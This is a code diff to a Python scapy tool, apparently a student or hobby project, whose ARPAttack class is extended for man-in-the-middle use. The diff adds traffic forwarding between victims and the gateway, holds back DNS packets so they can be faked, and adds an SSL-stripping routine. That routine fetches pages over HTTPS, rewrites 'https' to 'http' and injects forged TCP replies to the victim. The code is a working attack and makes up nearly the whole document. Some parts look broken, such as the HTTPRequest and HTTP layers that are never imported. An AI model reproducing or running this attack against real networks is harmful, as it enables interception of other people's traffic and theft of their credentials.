@@ -1,10 +1,26 @@
 from threading import Thread
 from time import sleep
-from scapy.all import ARP, Ether, IP, ICMP, sendp, send, sr, TCP
+from scapy.all import (
+    ARP,
+    Ether,
+    IP,
+    ICMP,
+    sendp,
+    send,
+    sr,
+    TCP,
+    DNS,
+    load_layer
+    )
 from entities import Host, Interface
 from util import Sniffer
+import http
+from http.client import HTTPSConnection
+import re
 
 class ARPAttack:
+    USE_SSL_STRIPPING = False
+
     def __init__(self,
             interface: Interface,
             gateway: Host = None,
@@ -47,24 +63,108 @@ class ARPAttack:
         if packet[IP].src == self.interface.ip_address:
             return
 
-        # victim -> gateway
-        if packet[IP].dst != self.interface.ip_address:
-            # print('Forwarding the following packet to the gateway')
-            # packet.show()
-            packet[Ether].dst = self.gateway.mac_address
-            packet[Ether].src = self.interface.mac_address
-            sendp(packet, verbose=0, iface=self.interface.name)
+        # We don't forward DNS requests because we need to fake them
+        if packet.haslayer(DNS):
             return
 
-        # gateway -> victim
+        if self.USE_SSL_STRIPPING:
+            if packet.haslayer(HTTPRequest):
+                self.perform_ssl_strip(packet)
+                return
+
+            # Don't forward tcp connections on port 80 (http)
+            if packet.haslayer(TCP) and packet[TCP].dport == 80:
+                # respond if only the SYN flag is set
+                flags = packet[TCP].flags
+                if 'S' in flags:
+                    response = IP() / TCP(flags='SA')
+                    response[IP].src = packet[IP].dst
+                    response[IP].dst = packet[IP].src
+                    response[TCP].sport = packet[TCP].dport
+                    response[TCP].dport = packet[TCP].sport
+                    response[TCP].ack = packet[TCP].seq + 1
+                    response[TCP].seq = 0
+
+                    send(response, verbose=0)
+                    
+                return
+
         for victim in self.victims:
+            # victim -> gateway
+            if packet[IP].src == victim.ip_address and packet[IP].dst != self.interface.ip_address:
+                packet[Ether].dst = self.gateway.mac_address
+                packet[Ether].src = self.interface.mac_address
+                sendp(packet, verbose=0)
+                return
+            # gateway -> victim
             if packet[IP].dst == victim.ip_address:
-                # print('Forwarding the following packet to the victim')
-                # packet.show()
                 packet[Ether].dst = victim.mac_address
                 packet[Ether].src = self.interface.mac_address
                 sendp(packet, verbose=0)
                 return
+            
+    def perform_ssl_strip(self, packet):
+        http_layer = packet[HTTPRequest]
+        status, headers, data = self.make_https_request(http_layer)
+        # Convert list of tuples to a dictionary, replacing spaces with underscores
+        headers = { header: value.replace('https', 'http') for header, value in headers }
+        # Replace https with http
+        data = data.replace('https', 'http')
+
+        http_response = self.build_http_response(status, headers, data)
+
+        segment_size = 1400
+        response_parts = [http_response[i:i+segment_size] for i in range(0, len(http_response), segment_size)]
+
+
+        bytes_read = packet[TCP].seq + len(packet[TCP].payload)
+        bytes_sent = packet[TCP].ack
+
+        for part in response_parts:
+            reply = IP(flags=2) / TCP() / HTTP() / part
+            reply[IP].src = packet[IP].dst
+            reply[IP].dst = packet[IP].src
+            reply[TCP].sport = packet[TCP].dport
+            reply[TCP].dport = packet[TCP].sport
+            reply[TCP].flags = "A"
+            reply[TCP].ack = bytes_read
+            reply[TCP].seq = bytes_sent
+
+            bytes_sent += len(part)
+
+            send(reply, verbose=0)
+
+    def build_http_response(self, status, headers, data):
+        response = f'HTTP/1.1 {status}\r\n'
+
+        for header, value in headers.items():
+            if header.lower() in ['content-length', 'content-encoding']:
+                continue
+            response += f'{header}: {value}\r\n'
+
+        response += f'Content-Length: {len(data) + 4}\r\n'
+        response += f'Content-Encoding: none\r\n'
+
+        response += '\r\n'
+        response += data
+        response += '\r\n\r\n'
+
+        return response
+
+    def make_https_request(self, http_layer):
+        host = http_layer.Host.decode('utf-8')
+        method = http_layer.Method.decode('utf-8')
+        path = http_layer.Path.decode('utf-8')
+
+        connection = HTTPSConnection(host)
+        connection.request(method, path, headers={'Accept-Charset': 'utf-8'})
+        
+        response = connection.getresponse()
+        data = response.read().decode('utf-8')
+        headers = response.getheaders()
+        status = response.status
+
+        return status, headers, data
 
     def ping(self):
         for victim in self.victims:
